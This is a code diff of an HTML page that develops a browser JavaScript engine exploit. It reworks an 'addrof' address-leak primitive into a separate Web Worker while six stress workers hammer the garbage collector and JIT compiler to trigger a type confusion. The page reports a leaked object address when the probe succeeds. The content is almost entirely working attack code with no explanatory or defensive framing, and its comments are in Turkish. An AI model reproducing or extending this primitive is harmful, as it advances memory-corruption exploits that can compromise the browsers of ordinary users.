@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html><body>
-<h1 id="s">Running...</h1>
+<h1 id="s">Waiting...</h1>
 <div id="log" style="font-size:16px"></div>
 <script>
 function log(s){document.getElementById('log').innerHTML+=s+'<br>';}
 
-// WORKER: GC + JIT stress
-var wCode = `
+// STRESS WORKERS
+var wStress=`
   function leak(o){return o.a+o.b+o.c+o.d;}
   for(var i=0;i<300000;i++) leak({a:1.1,b:2.2,c:3.3,d:4.4});
   while(true){
@@ -16,40 +16,23 @@ var wCode = `
     arr=null;
   }
 `;
-var u=URL.createObjectURL(new Blob([wCode],{type:'text/javascript'}));
+var u=URL.createObjectURL(new Blob([wStress],{type:'text/javascript'}));
 for(var i=0;i<6;i++) new Worker(u);
 
-// ANA THREAD: GC stress
-function leak(o){return o.a+o.b+o.c+o.d;}
-for(var i=0;i<300000;i++) leak({a:1.1,b:2.2,c:3.3,d:4.4});
-
-var tick=0;
-function gcStress(){
-  var big=new Array(100000).fill({a:1.1,b:2.2,c:3.3,d:4.4});
-  big.forEach(leak);
-  big=null;
-  tick++;
-  if(tick<200) setTimeout(gcStress,0);
-}
-gcStress();
-
-// ADDROF PROBE: aynı anda çalışıyor
-function addrof(val){
-  var arr=[1.1,2.2,3.3];
-  function rd(a){return a[0];}
-  for(var i=0;i<200000;i++) rd([1.1,2.2,3.3]);
-  arr[0]=val;
-  return rd(arr);
-}
-
-var target={secret:0x1337};
-var attempt=0;
-var gotIt=false;
-
-function probe(){
-  if(gotIt) return;
-  attempt++;
-  try{
+// ADDROF WORKER — ayrı thread
+var wProbe=`
+  function addrof(val){
+    var arr=[1.1,2.2,3.3];
+    function rd(a){return a[0];}
+    for(var i=0;i<200000;i++) rd([1.1,2.2,3.3]);
+    arr[0]=val;
+    return rd(arr);
+  }
+  var target={secret:0x1337};
+  var attempt=0;
+  
+  function probe(){
+    attempt++;
     var leaked=addrof(target);
     var buf=new ArrayBuffer(8);
     var dv=new DataView(buf);
@@ -57,21 +40,27 @@ function probe(){
     var lo=dv.getUint32(0,true);
     var hi=dv.getUint32(4,true);
     var isNaN_val=(hi===0x7ff80000&&lo===0);
-
+    
     if(!isNaN_val){
-      gotIt=true;
-      document.getElementById('s').textContent=
-        '✅ attempt '+attempt+': 0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0');
+      postMessage('GOT: 0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0')+' attempt:'+attempt);
       return;
     }
-    if(attempt%100===0) log('attempt '+attempt+' — NaN');
-    setTimeout(probe,5);
-  }catch(e){
-    document.getElementById('s').textContent='EXCEPTION attempt '+attempt+': '+e;
+    if(attempt%50===0) postMessage('attempt '+attempt+' NaN');
+    setTimeout(probe,2);
   }
-}
+  
+  // Stress worker'lar ısınsın
+  setTimeout(probe,4000);
+`;
 
-// Workers + GC ısınsın sonra probe
-setTimeout(probe,3000);
+var pw=new Worker(URL.createObjectURL(new Blob([wProbe],{type:'text/javascript'})));
+pw.onmessage=function(e){
+  log(e.data);
+  if(e.data.indexOf('GOT')===0){
+    document.getElementById('s').textContent='✅ '+e.data;
+  }
+};
+
+document.getElementById('s').textContent='Running...';
 </script>
 </body></html>
